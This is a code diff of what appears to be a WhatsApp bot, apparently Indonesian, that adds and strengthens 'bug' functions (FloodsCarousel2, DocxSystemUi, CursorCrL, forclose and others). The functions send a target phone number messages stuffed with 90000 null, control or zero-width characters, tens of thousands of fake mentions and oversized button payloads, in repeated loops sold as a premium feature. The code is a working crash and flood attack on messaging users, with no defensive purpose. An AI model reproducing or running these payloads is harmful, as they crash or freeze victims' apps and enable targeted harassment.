@@ -72,24 +72,21 @@ console.log(`┃¤ ${chalk.hex("#FFA500")("📍 Di:")} ${chalk.hex("#FFFFFF")(`$
 console.log(`┃¤ ${chalk.hex("#00FF00")("📝 Pesan:")} ${chalk.hex("#FFFFFF")(`${body || m?.mtype || "Unknown"}`)} `);
 console.log("┗━━━━━━━━━━━━━━━━━━━━━━━=")}
 //FUNCTION BUG
-//pelerrrr
 const NullNihBos = {
       key: {
-        remoteJid: "p",
+        remoteJid: "\u0000".repeat(90000),
         fromMe: false,
         participant: "0@s.whatsapp.net",
       },
       message: {
         interactiveResponseMessage: {
           body: {
-            text: "ᴋᴏɴᴛᴏʟ ʙᴀᴘᴀᴋ ᴋᴀᴜ』ꪾ",
+            text: "ᴋᴏɴᴛᴏʟ ʙᴀᴘᴀᴋ ᴋᴀᴜ』ꪾ" + "\u0000".repeat(90000),
             format: "DEFAULT",
           },
           nativeFlowResponseMessage: {
             name: "galaxy_message",
-            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"ꦾ".repeat(
-              500000
-            )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"ꦾ\u0000".repeat(90000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
             version: 3,
           },
         },
@@ -309,7 +306,7 @@ async function protocolbug3(target, mention) {
                     fileLength: "999999",
                     seconds: 999999,
                     mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
-                    caption: "\u9999",
+                    caption: "\u0000".repeat(90000),
                     height: 999999,
                     width: 999999,
                     fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
@@ -334,8 +331,8 @@ async function protocolbug3(target, mention) {
                                 embeddedMusic: {
                                     musicContentMediaId: "kontol",
                                     songId: "peler",
-                                    author: "\u9999",
-                                    title: "\u9999",
+                                    author: "\u0000".repeat(90000),
+                                    title: "\u0000".repeat(90000),
                                     artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                     artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                     artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
@@ -471,6 +468,195 @@ async function protocolbug3(target, mention) {
   }
 }
 
+async function FloodsCarousel2(target, Ptcp = true) {
+      const header = proto.Message.InteractiveMessage.Header.create({
+        ...(await prepareWAMessageMedia(
+          { image: { url: "https://files.catbox.moe/wek01l.jpg" } },
+          { upload: Hangz.waUploadToServer }
+        )),
+        title: "𝓥𝓪𝓶𝓹𝓲𝓻𝓮 𝓘𝓼 𝓑𝓪𝓬𝓴\n" + "\u0003".repeat(90000),
+        subtitle: "ʜᴀɴɢᴢᴄʀᴀsʜᴇʀ",
+        hasMediaAttachment: true,
+      });
+      const body = {
+        text: "\u0003" + "\u0003".repeat(90000),
+      };
+      const carouselMessage = {
+        sections: [
+          {
+            title: " ʜᴀɴɢᴢᴄʀᴀsʜᴇʀ",
+            rows: [
+              {
+                title: "ʜᴀɴɢᴢᴄʀᴀsʜᴇʀ",
+                description: "\u0003".repeat(90000),
+                rowId: "\u0003".repeat(90000),
+              },
+              {
+                title: " 😶‍🌫️ ",
+                description: "\u0003".repeat(90000),
+                rowId: "\u0003".repeat(90000),
+              },
+            ],
+          },
+          {
+            title: "ʜᴀɴɢᴢᴄʀᴀsʜᴇʀ",
+            rows: [
+              {
+                title: "ʜᴀɴɢᴢᴄʀᴀsʜᴇʀ",
+                description: "\u0003".repeat(90000),
+                rowId: "\u0003".repeat(90000),
+              },
+              {
+                title: " 😶‍🌫️ ",
+                description: "\u0003".repeat(90000),
+                rowId: "\u0003".repeat(90000),
+              },
+            ],
+          },
+        ],
+      };
+      await Hangz.relayMessage(
+        target,
+        {
+          ephemeralMessage: {
+            message: {
+              interactiveMessage: {
+                header: header,
+                body: body,
+                carouselMessage: carouselMessage,
+              },
+            },
+          },
+        },
+        Ptcp
+          ? {
+              participant: {
+                jid: target,
+                quoted: NullNihBos
+              },
+            }
+          : {}
+      );
+    }
+
+async function DocxSystemUi(target) {
+    try {
+        const documentMessage = {
+            url: "https://mmg.whatsapp.net/v/t62.7119-24/11923856_1474185146798290_6048054041675266856_n.enc?ccb=11-4&oh=01_Q5Aa1gGK5NXiXioJlvQ8QU3BT5oshVKOXjEPT4EUSbNFo4IkIQ&oe=686B0FA7&_nc_sid=5e03e0&mms3=true",
+            title: "\u0000".repeat(90000),
+            fileSha256: "tJxI2OsQ2EwgEIcTNo8DLmYcKvYPrYDfxxbIpvmczfU=",
+            mediaKey: "89tK2gWWAKun8dxalKD7WO5e3SE1GF7pIdwbh6prkxw=",
+            mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+            fileName: "\u0000".repeat(90000),
+            fileEncSha256: "3e4rMVkvA+g47xtcIm16hHnDrTk5efdFNjuXpcMfzgo=",
+            directPath: "/v/t62.7119-24/11923856_1474185146798290_6048054041675266856_n.enc?ccb=11-4&oh=01_Q5Aa1gGK5NXiXioJlvQ8QU3BT5oshVKOXjEPT4EUSbNFo4IkIQ&oe=686B0FA7&_nc_sid=5e03e0",
+            fileLength: { low: 1, high: 1, unsigned: true },
+            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
+            contactVcard: false,
+            contextInfo: {
+                mentionedJid: [
+                    "0@s.whatsapp.net",
+                    ...Array.from(
+                        {
+                            length: 40000,
+                        },
+                        () =>
+                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
+                    ),
+                ]
+            }
+        }
+        let msg = generateWAMessageFromContent(target, {
+            viewOnceMessage: { message: { documentMessage } }
+        }, {});
+        await Hangz.relayMessage(target, msg.message, { participants: { jid: target }, messageId: msg.key.id });
+    } catch (err) {
+        console.error("Gagal mengirim pesan:", err);
+    }
+}
+
+async function CursorCrL(target) {
+  const msg = await generateWAMessageFromContent(target, {
+    viewOnceMessage: {
+      message: {
+        messageContextInfo: {
+          deviceListMetadata: {},
+          deviceListMetadataVersion: 2
+        },
+        interactiveMessage: {
+          body: { 
+            text: "\u0000".repeat(90000)
+          },
+          footer: { 
+            text: "\u0000".repeat(90000)
+          },
+          carouselMessage: {
+            cards: [
+              {               
+                header: {
+                  title: 'ʜᴀɴɢᴢᴄʀᴀsʜᴇʀ • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸',
+                  imageMessage: {
+                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
+                    mimetype: "image/jpeg",
+                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
+                    fileLength: "164089",
+                    height: 1,
+                    width: 1,
+                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
+                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
+                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
+                    mediaKeyTimestamp: "1749172037",
+                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
+                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
+                    scanLengths: [8596, 155493]
+                  },
+                  hasMediaAttachment: true, 
+                },
+                body: { 
+                  text: "ʜᴀɴɢᴢᴄʀᴀsʜᴇʀ • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸"
+                },
+                footer: {
+                  text: "\u0000".repeat(90000)
+                },
+                nativeFlowMessage: {
+                  messageParamsJson: "\n".repeat(90000) 
+                }
+              }
+            ]
+          },
+          contextInfo: {
+            participant: "0@s.whatsapp.net",             
+            quotedMessage: {
+              viewOnceMessage: {
+                message: {
+                  interactiveResponseMessage: {
+                    body: {
+                      text: "Sent",
+                      format: "DEFAULT"
+                    },
+                    nativeFlowResponseMessage: {
+                      name: "galaxy_message",
+                      paramsJson: "{ phynx.json }",
+                      version: 3
+                    }
+                  }
+                }
+              }
+            },
+            remoteJid: "@s.whatsapp.net"
+          }
+        }
+      }
+    }
+  }, {});
+
+  await Hangz.relayMessage(target, msg.message, {
+    participant: { jid: target },
+    messageId: msg.key.id
+  });
+  console.log(chalk.green(`Successfully Send ${chalk.red("CursorCrl")} to ${target}`))
+}
+
 async function ZakrenzTrashXUI(target) {
   const jidList = [
     "120363383395@s.whatsapp.net",
@@ -484,7 +670,7 @@ async function ZakrenzTrashXUI(target) {
     },
     message: {
       extendedTextMessage: {
-        text: "ꦾꦽ" + "ꦾꦽ".repeat(500)
+        text: "ꦾꦽ" + "ꦾꦽ".repeat(90000)
       }
     }
   };
@@ -501,12 +687,12 @@ async function ZakrenzTrashXUI(target) {
   const bytePayload = Buffer.from(
     Array.from({ length: 2048 }, () => Math.floor(Math.random() * 256))
   ).toString("base64");
-  const glitchText = String.fromCharCode(...Array(300).fill(0x200B)) + "꧀ꦽꦾꦻꦸꦃ".repeat(100);
+  const glitchText = String.fromCharCode(...Array(300).fill(0x200B)) + "꧀ꦽꦾꦻꦸꦃ".repeat(90000);
   const sysIntPayload = new Int32Array(500)
     .map(() => Math.floor(Math.random() * 1e6))
     .join("\u200B");
   const apiClientDataString = JSON.stringify(apiClientData, null, 2);
-  const unicodeOverload = "\u200F\u200E\u200D\u200C\u202E\u2066\uFEFF".repeat(300);
+  const unicodeOverload = "\u200F\u200E\u200D\u200C\u202E\u2066\uFEFF".repeat(90000);
   let deepNestedJSON = {};
   let current = deepNestedJSON;
   for (let i = 0; i < 100; i++) {
@@ -514,11 +700,11 @@ async function ZakrenzTrashXUI(target) {
     current = current["x"];
   }
   const deepJSONPayload = JSON.stringify(deepNestedJSON);
-  const invisibleNameSpam = "\u2063".repeat(300);
-  const invisibleCrasher = "\u0000".repeat(300);
-  const emojiFlood = "❄️".repeat(300);
+  const invisibleNameSpam = "\u2063".repeat(90000);
+  const invisibleCrasher = "\u0000".repeat(90000);
+  const emojiFlood = "❄️".repeat(90000);
   const trashBody =
-    "꧀ꦽꦾꦻꦸꦃ".repeat(300) +
+    "꧀ꦽꦾꦻꦸꦃ".repeat(90000) +
     glitchText +
     bytePayload +
     sysIntPayload +
@@ -562,7 +748,7 @@ async function ZakrenzTrashXUI(target) {
         }));
     };
     const cancelButton = repeatButton(
-        "cta_cancel_reminder",`{\"display_text\":\"${"\u0052\u0045\u0059\u0048\u0041\u004E6610" + "𑶑".repeat(10000) + "\u0000".repeat(10000)}\",\"id\":\"\"}`
+        "cta_cancel_reminder",`{\"display_text\":\"${"\u0052\u0045\u0059\u0048\u0041\u004E6610" + "𑶑".repeat(90000) + "\u0000".repeat(90000)}\",\"id\":\"\"}`
     );
     const randomJid = () => {
         const randomNum = Math.floor(1000000000 + Math.random() * 9000000000);
@@ -588,7 +774,7 @@ async function ZakrenzTrashXUI(target) {
                         text: null
                     }),
                     header: proto.Message.InteractiveMessage.Header.create({
-                        title: "ꦾꦸ".repeat(10300), //Ganti Kalok mau
+                        title: "ꦾꦸ".repeat(90000), //Ganti Kalok mau
                         subtitle: null,
                         hasMediaAttachment: false
                     }),
@@ -666,7 +852,7 @@ const mentionedList = [
     const embeddedMusic = {
         musicContentMediaId: "589608164114571",
         songId: "870166291800508",
-        author: ".Tama Ryuichi" + "ោ៝".repeat(10000),
+        author: ".Tama Ryuichi" + "ោ៝".repeat(90000),
         title: "Finix",
         artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
         artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
@@ -762,7 +948,7 @@ const mentionedList = [
 }
 //new
 async function BlankScreen(target, Ptcp = false) {
-        let virtex = "ᴋᴏɴᴛᴏʟ ʙᴀᴘᴀᴋ ᴋᴀᴜ』ꪾ" + "\u0003".repeat(90000);
+        let virtex = "ᴋᴏɴᴛᴏʟ ʙᴀᴘᴀᴋ ᴋᴀᴜ』ꪾ" + "\u0000".repeat(90000);
 			await Hangz.relayMessage(target, {
 					ephemeralMessage: {
 						message: {
@@ -1052,38 +1238,38 @@ async function forclose(target) {
                         mentionedJid: ["13135550002@s.whatsapp.net"],
                     },
                     body: {
-                        text: "\u0003" + "ꦽ".repeat(102002) + "\u0003".repeat(102002)
+                        text: "\u0003" + "ꦽ".repeat(90000) + "\u0003".repeat(90000)
                     },
                     nativeFlowMessage: {
                         buttons: [
-                            { name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "payment_method", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(9999), voice_call: "call_galaxy" },
-                            { name: "form_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "catalog_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "payment_info", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "review_order", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "send_location", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "payments_care_csat", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "view_product", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "payment_settings", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "address_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "open_webview", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "message_with_link_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "payment_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "galaxy_costum", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "extensions_message_v2", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "landline_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "mpm", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "cta_copy", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "cta_url", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "review_and_pay", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "galaxy_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                            { name: "cta_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) }
+                            { name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "payment_method", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(90000), voice_call: "call_galaxy" },
+                            { name: "form_message", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "catalog_message", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "payment_info", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "review_order", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "send_location", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "payments_care_csat", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "view_product", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "payment_settings", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "address_message", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "open_webview", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "message_with_link_status", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "payment_status", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "galaxy_costum", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "extensions_message_v2", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "landline_call", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "mpm", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "cta_copy", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "cta_url", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "review_and_pay", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "galaxy_message", buttonParamsJson: venomModsData + "\u0003".repeat(90000) },
+                            { name: "cta_call", buttonParamsJson: venomModsData + "\u0003".repeat(90000) }
                         ]
                     }
                 }
@@ -1626,7 +1812,9 @@ target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
             await VampireNotifCrash(target);
             await TrashSocket(target);
             await BulldozerFuxker(target);
-            await ZakrenzTrashXUI(target);
+            await DocxSystemUi(target);
+            await CursorCrL(target);
+            await FloodsCarousel2(target);
             await sleep(1500);
             await trashprotocol(target);
             await bulldozer(target);
@@ -1643,7 +1831,9 @@ target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
             await VampireNotifCrash(target);
             await TrashSocket(target);
             await BulldozerFuxker(target);
-            await ZakrenzTrashXUI(target);
+            await DocxSystemUi(target);
+            await CursorCrL(target);
+            await FloodsCarousel2(target);
             await sleep(2500);
             }
           }
@@ -1655,14 +1845,18 @@ if (!isPremium) return m.reply('Khusus Premium');
 if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628���`);
 target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
           for (let i = 0; i < 35; i++) {
-            await ZakrenzTrashXUI(target);
+            await FloodsCarousel2(target);
+            await CursorCrL(target);
+            await DocxSystemUi(target);
             await forclose(target);
             await UiNew(target);
             await HadesNewUi(target);
             await TrashSocket(target);
             await BulldozerFuxker(target);
             await sleep(2000);
-            await ZakrenzTrashXUI(target);
+            await FloodsCarousel2(target);
+            await CursorCrL(target);
+            await DocxSystemUi(target);
             await forclose(target);
             await UiNew(target);
             await HadesNewUi(target);
